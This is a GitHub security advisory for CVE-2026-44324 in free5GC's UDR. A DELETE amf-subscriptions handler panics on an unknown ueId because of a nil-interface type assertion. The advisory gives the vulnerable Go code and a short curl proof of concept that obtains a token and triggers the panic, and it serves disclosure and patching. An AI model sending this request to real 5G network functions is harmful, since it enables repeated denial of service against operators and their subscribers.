# [M] free5GC's UDR nudr-dr DELETE amf-subscriptions panics on missing UE state via nil interface type assertion (single authenticated request)

## Summary
Severity: Medium
Advisory: GHSA-jqfc-gwj5-3w63
CVE: CVE-2026-44324
CWE: CWE-704, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-jqfc-gwj5-3w63
Type: github-advisory

## Affected
- Go: `github.com/free5gc/udr` — affected >=0 <1.4.3

## Details
### Summary
free5GC's UDR `nudr-dr` `DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` handler panics on a single authenticated request against a fresh UDR instance when the supplied `ueId` does not exist in `UESubsCollection`. The processor checks `value, ok := udrSelf.UESubsCollection.Load(ueId)` and sets a `404 USER_NOT_FOUND` problem-details on the miss path, but execution continues and immediately runs `value.(*udr_context.UESubsData)` -- a Go type assertion on a nil interface, which panics with `interface conversion: interface {} is nil, not *context.UESubsData`. Gin recovery converts the panic into `HTTP 500`, but the endpoint remains repeatedly panicable.

This is the no-precondition sibling of free5gc/free5gc#919: same handler, same bug pattern (set `pd`, do not return, then dereference), but the panic site is the nil-interface type assertion at line 61 instead of the nil-pointer deref at line 69. No earlier EE-subscription create is required.

This endpoint requires a valid `nudr-dr` OAuth2 access token (PR:L, NOT PR:N), so this is scored as an authenticated panic-DoS, not as an unauth-bypass finding.

### Details
Validated against the UDR container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/udr:v4.2.1`
- Runtime UDR commit: `754d23b0`
- Docker validation date: 2026-03-22
- UDR endpoint: `http://10.100.200.11:8000`

Vulnerable handler (the `ok` miss path sets `pd` but does not return; the next line type-asserts the nil interface):
```go
subsId := c.Params.ByName("subsId")
s.Processor().RemoveAmfSubscriptionsInfoProcedure(c, subsId, ueId)
```
In the processor:
```go
value, ok := udrSelf.UESubsCollection.Load(ueId)
if !ok {
    pd = util.ProblemDetailsNotFound("USER_NOT_FOUND")
}

UESubsData := value.(*udr_context.UESubsData)   // panics: nil interface
```
When `ueId` is absent from `UESubsCollection`, `value` is the nil `interface{}` returned by `sync.Map.Load`, and `value.(*udr_context.UESubsData)` panics with:
```
panic: interface conversion: interface {} is nil, not *context.UESubsData
```

Code evidence (paths in `free5gc/udr`):
- Route exposure + handler dispatch:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2170`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- Panic root cause (nil interface type assertion):
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:53`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:56`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61`

### PoC
Reproduced end-to-end against the running UDR at `http://10.100.200.11:8000` -- single authenticated request, no preconditions.

1. Restart UDR (clean state -- proves no precondition is needed):
```
docker restart udr
```

2. Obtain a valid `nudr-dr` token from NRF:
```
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

3. Trigger the panic with one DELETE for a nonexistent `ueId=x`:
```
curl -i -sS -X DELETE \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```
```
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

4. UDR container logs (`docker logs udr`) confirm the nil-interface conversion panic at `event_amf_subscription_info_document.go:61` inside `RemoveAmfSubscriptionsInfoProcedure`:
```
[ERRO][UDR][GIN] panic: interface conversion: interface {} is nil, not *context.UESubsData
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
    .../event_amf_subscription_info_document.go:61
github.com/free5gc/udr/internal/sbi.(*Server).HandleRemoveAmfSubscriptionsInfo
    .../api_datarepository.go:2172
[INFO][UDR][GIN] | 500 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |
```

### Impact
Incorrect type conversion on a nil interface (CWE-704) inside an authenticated UDR data-repository handler, caused by improper handling of the missing-ueId branch (CWE-754): the handler sets a `404` problem-details value but does not return, then runs a Go type assertion on the nil interface returned by `sync.Map.Load`.

This is NOT framed as an auth-bypass finding: the endpoint requires a valid `nudr-dr` OAuth2 access token. A network attacker who already holds (or can obtain) a valid token can:
- Trigger a reliable, single-request panic on the `amf-subscriptions` delete route against a fresh UDR (no preparatory state needed -- this is strictly easier than free5gc/free5gc#919).
- Repeat the trigger to sustain a per-request panic-DoS on UDR's data-repository surface, with each panic costing more CPU + log writes than the intended `404 USER_NOT_FOUND` response would have.

No Confidentiality impact (the response is `500` with empty body). No Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation (Gin recovers; the UDR process keeps running).

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/920
Upstream fix: https://github.com/free5gc/udr/pull/60

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-jqfc-gwj5-3w63
- https://nvd.nist.gov/vuln/detail/CVE-2026-44324
- https://github.com/free5gc/free5gc/issues/920
- https://github.com/free5gc/udr/pull/60
- https://github.com/free5gc/udr/commit/8a1d3c63be99d378806d771f086ff32f1867da99
- https://github.com/free5gc/free5gc
